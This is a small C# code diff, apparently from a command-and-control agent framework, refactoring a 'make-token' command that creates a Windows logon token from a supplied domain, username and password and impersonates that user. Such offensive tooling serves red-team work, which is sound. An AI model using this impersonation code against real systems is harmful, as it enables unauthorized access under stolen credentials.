@@ -16,7 +16,7 @@ namespace Commands
     public class MakeTokenCommand : AgentCommand
     {
         public override string Name => "make-token";
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             // make-token DOMAIN\Username Password
             var userDomain = task.SplittedArgs[0];
@@ -32,15 +32,15 @@ namespace Commands
                 if (Agent.Native.Advapi.ImpersonateLoggedOnUser(hToken))
                    {
                     var identity = new WindowsIdentity(hToken);
-                    result.Result += $"Successfully impersonated {identity.Name}";
+                    context.Result.Result += $"Successfully impersonated {identity.Name}";
                     return;
                 }
 
-                result.Result += $"Successfully made token but failed to impersonate";
+                context.Result.Result += $"Successfully made token but failed to impersonate";
                 return;
             }
 
-            result.Result += $"Failed to make token";
+            context.Result.Result += $"Failed to make token";
             return;
         }
     }
